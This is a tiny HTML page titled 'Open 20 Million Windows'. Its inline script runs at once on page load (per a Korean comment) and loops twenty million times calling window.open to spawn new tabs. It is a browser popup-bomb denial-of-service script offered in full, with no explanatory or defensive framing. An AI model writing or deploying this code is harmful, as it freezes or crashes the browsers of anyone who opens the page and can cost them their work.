<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open 20 Million Windows</title>
</head>
<body>
    <script>
        function openMillionsOfWindows() {
            for (let i = 0; i < 20000000; i++) {
                window.open("https://example.com", "_blank");
            }
        }

        // 페이지가 로드될 때 바로 실행
        openMillionsOfWindows();
    </script>
</body>
</html>
